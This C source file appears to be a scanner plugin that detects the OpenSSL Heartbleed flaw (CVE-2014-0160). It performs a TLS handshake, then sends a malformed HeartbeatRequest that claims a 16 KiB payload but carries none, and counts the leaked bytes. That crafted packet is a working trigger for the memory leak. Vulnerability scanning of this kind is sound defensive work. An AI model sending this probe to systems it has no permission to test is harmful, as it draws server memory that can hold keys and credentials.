/*
 * ssl-heartbleed-full - full OpenSSL Heartbleed probe (CVE-2014-0160).
 *
 * Two stages:
 *   1. A real TLS handshake via OpenSSL (libssl/libcrypto) to confirm the
 *      endpoint speaks TLS and to report the negotiated protocol version
 *      and cipher suite.
 *   2. The Heartbleed test itself over a raw socket: a ClientHello that
 *      advertises the Heartbeat extension is sent in cleartext, the
 *      ServerHello flight is read, then a malformed HeartbeatRequest is
 *      injected (claims a 16 KiB payload but carries none). A server that
 *      replies with an over-long HeartbeatResponse is leaking memory and
 *      is vulnerable; the number of leaked bytes is reported.
 *
 * The malformed heartbeat must travel before the handshake is finished,
 * while records are still plaintext, so OpenSSL (which refuses to emit a
 * malformed heartbeat) cannot perform stage 2 - hence the raw probe.
 *
 * Build: gcc -std=c99 -Wall -Wextra -shared -fPIC \
 *          -o ssl-heartbleed-full.so ssl-heartbleed-full.c -lssl -lcrypto
 *
 * Use only on networks you own or have permission to scan.
 */
#include "arsenal_tls.h"

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/socket.h>
#include <sys/time.h>

/* Stage 1: OpenSSL handshake. Fills ver/cipher (static strings owned by
 * OpenSSL / our buffer). Returns 1 on a completed handshake, 0 otherwise. */
static int hb_openssl_info(AlScriptContext *ctx, char *ver, size_t ver_cap,
                           char *cipher, size_t cipher_cap) {
    SSL_CTX *sctx;
    SSL *ssl;
    int fd;
    int flags;
    int ok = 0;
    struct timeval tv;

    ver[0] = '\0';
    cipher[0] = '\0';

    fd = as_connect(ctx);
    if (fd < 0) {
        return 0;
    }
    /* OpenSSL wants a blocking socket with a bounded timeout. */
    flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) {
        (void)fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
    }
    tv.tv_sec = ctx->timeout_ms / 1000;
    tv.tv_usec = (ctx->timeout_ms % 1000) * 1000;
    (void)setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    (void)setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    sctx = SSL_CTX_new(TLS_client_method());
    if (sctx == NULL) {
        close(fd);
        return 0;
    }
    /* Accept legacy servers: no cert verification, lowest security level. */
    SSL_CTX_set_verify(sctx, SSL_VERIFY_NONE, NULL);
#ifdef SSL_CTX_set_security_level
    SSL_CTX_set_security_level(sctx, 0);
#endif
    (void)SSL_CTX_set_cipher_list(sctx, "ALL:eNULL:@SECLEVEL=0");
#ifdef TLS1_VERSION
    (void)SSL_CTX_set_min_proto_version(sctx, TLS1_VERSION);
#endif

    ssl = SSL_new(sctx);
    if (ssl == NULL) {
        SSL_CTX_free(sctx);
        close(fd);
        return 0;
    }
    SSL_set_fd(ssl, fd);
    if (SSL_connect(ssl) == 1) {
        const char *v = SSL_get_version(ssl);
        const char *c = SSL_get_cipher_name(ssl);
        if (v != NULL) {
            (void)snprintf(ver, ver_cap, "%s", v);
        }
        if (c != NULL) {
            (void)snprintf(cipher, cipher_cap, "%s", c);
        }
        ok = 1;
        (void)SSL_shutdown(ssl);
    }
    SSL_free(ssl);
    SSL_CTX_free(sctx);
    close(fd);
    return ok;
}

/* Stage 2: raw Heartbleed probe for one TLS version. Returns 1 if the
 * server leaks (vulnerable) and stores the leaked byte count in *leaked,
 * 0 if it does not leak, -1 if no ServerHello was obtained. */
static int hb_raw_probe(AlScriptContext *ctx, unsigned int version,
                        unsigned char *resp, size_t cap, long *leaked) {
    unsigned char hello[1200];
    unsigned char hb[8];
    unsigned int sver = 0;
    unsigned int scipher = 0;
    int sid = 0;
    int hlen;
    int fd;
    int n;

    *leaked = 0;
    hlen = ar_tls_client_hello(hello, sizeof(hello), version,
                               ar_tls_ciphers,
                               (int)(sizeof(ar_tls_ciphers) /
                                     sizeof(ar_tls_ciphers[0])), 1);
    if (hlen < 0) {
        return -1;
    }
    fd = as_connect(ctx);
    if (fd < 0) {
        return -1;
    }
    if (as_send_all(fd, hello, (size_t)hlen, ctx->timeout_ms) != 0) {
        close(fd);
        return -1;
    }
    n = ar_tls_read_record(fd, resp, cap, ctx->timeout_ms);
    if (n <= 0 || resp[0] == AR_TLS_ALERT ||
        ar_tls_parse_server_hello(resp, n, &sver, &scipher, &sid) != 0) {
        close(fd);
        return -1;
    }
    /* Drain any further handshake records (Certificate, etc.) that arrived
     * with the ServerHello so the heartbeat reply is read cleanly. The
     * server flight ends at ServerHelloDone (handshake type 14). */
    {
        int guard;
        for (guard = 0; guard < 8; guard++) {
            if (n >= 1 && resp[0] == AR_TLS_HANDSHAKE && n >= 6 &&
                resp[5] == 14) {
                break;
            }
            if (resp[0] == AR_TLS_ALERT) {
                break;
            }
            n = ar_tls_read_record(fd, resp, cap, 300);
            if (n <= 0) {
                break;
            }
        }
    }
    /* Malformed HeartbeatRequest: payload_length claims 0x4000 (16 KiB)
     * but the record carries no payload at all. */
    hb[0] = AR_TLS_HEARTBEAT;
    hb[1] = (unsigned char)(version >> 8);
    hb[2] = (unsigned char)(version & 0xFFu);
    hb[3] = 0x00;
    hb[4] = 0x03;          /* record length = 3 */
    hb[5] = 0x01;          /* HeartbeatMessageType = request */
    hb[6] = 0x40;          /* payload_length high */
    hb[7] = 0x00;          /* payload_length low  */
    if (as_send_all(fd, hb, sizeof(hb), ctx->timeout_ms) != 0) {
        close(fd);
        return -1;
    }
    n = ar_tls_read_record(fd, resp, cap, 800);
    close(fd);
    if (n > 3 && resp[0] == AR_TLS_HEARTBEAT) {
        *leaked = n;
        return 1;
    }
    return 0;
}

int almap_script_run(AlScriptContext *ctx) {
    unsigned char resp[AR_BUF];
    char ver[32];
    char cipher[64];
    static const unsigned int versions[] = { 0x0303, 0x0302, 0x0301 };
    int tls_ok;
    int got_hello = 0;
    size_t i;

    if (!ar_valid(ctx)) {
        return 1;
    }
    tls_ok = hb_openssl_info(ctx, ver, sizeof(ver), cipher, sizeof(cipher));

    for (i = 0; i < sizeof(versions) / sizeof(versions[0]); i++) {
        long leaked = 0;
        int rc = hb_raw_probe(ctx, versions[i], resp, sizeof(resp), &leaked);
        if (rc == 1) {
            ar_out(ctx,
                   "VULNERABLE: OpenSSL Heartbleed (CVE-2014-0160) - "
                   "server leaked %ld bytes via %s HeartbeatResponse",
                   leaked, ar_tls_version_name(versions[i]));
            if (tls_ok) {
                ar_append(ctx, " [handshake: %s/%s]", ver, cipher);
            }
            return 0;
        }
        if (rc == 0) {
            got_hello = 1;
        }
    }

    if (got_hello || tls_ok) {
        if (tls_ok) {
            ar_out(ctx, "not vulnerable: OpenSSL Heartbleed "
                   "(handshake: %s/%s; heartbeat not honored)", ver, cipher);
        } else {
            ar_out(ctx, "not vulnerable: OpenSSL Heartbleed "
                   "(TLS ServerHello seen; heartbeat not honored)");
        }
    } else {
        ar_out(ctx, "Heartbleed: no TLS handshake on port %d", ctx->port);
    }
    return 0;
}
